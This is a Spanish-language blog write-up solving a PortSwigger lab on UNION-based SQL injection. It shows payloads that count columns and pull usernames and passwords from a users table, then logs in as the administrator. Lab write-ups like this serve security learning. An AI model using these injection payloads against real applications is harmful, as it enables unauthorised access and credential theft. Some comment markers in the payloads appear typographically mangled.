---
layout: single
title: SQL Injection UNION attack, retrieving data from other tables – PortSwigger Write Up
excerpt: "En este post vamos a estar resolviendo el laboratorio de PortSwigger: “SQL Injection UNION attack, retrieving data from other tables."
date: 2022-10-13
classes: wide
#header:
#  teaser: /assets/images/portswigger/stored_xss_into_html_context_with_nothing_encoded/portada.png
#  teaser_home_page: true
categories:
  - Portswigger
tags:
  - SQL Injection
  - Apprentice
---

En este post vamos a estar resolviendo el laboratorio de PortSwigger: "SQL Injection UNION attack, retrieving data from other tables."

## Pasos

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/1.png" width="1000">
</p><br>


En este artículo, se solicita obtener la información de nombre de usuario y contraseña en la tabla de usuarios utilizando la vulnerabilidad de inyección SQL.

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/2.png" width="1000">
</p><br>

Comencemos identificando primero el número de columnas:

```plaintext
' UNION SELECT NULL —

'+UNION+SELECT+NULL —
```

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/3.png" width="1000">
</p><br>

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/4.png" width="1000">
</p><br>

Detectamos que hay 2 columnas.

Para esto, podemos crear la consulta SQL usando la palabra clave UNION de la siguiente manera.

```plaintext
‘ UNION SELECT username,password FROM users —
```

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/5.png" width="1000">
</p><br>

```plaintext
‘+UNION+SELECT+username,password+FROM+users- -
```

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/6.png" width="1000">
</p><br>

Iniciemos sesión en el sistema con el usuario administrador.

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/7.png" width="1000">
</p><br>

Después de un inicio de sesión exitoso, completamos el laboratorio.

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/8.png" width="1000">
</p><br>

<p align="center">
     <img src="/assets/images/portswigger/sql_injection_union_attack_retrieving_data_from_other_tables/9.png" width="1000">
</p><br>

¡Un saludo y espero que os sirva de apoyo!
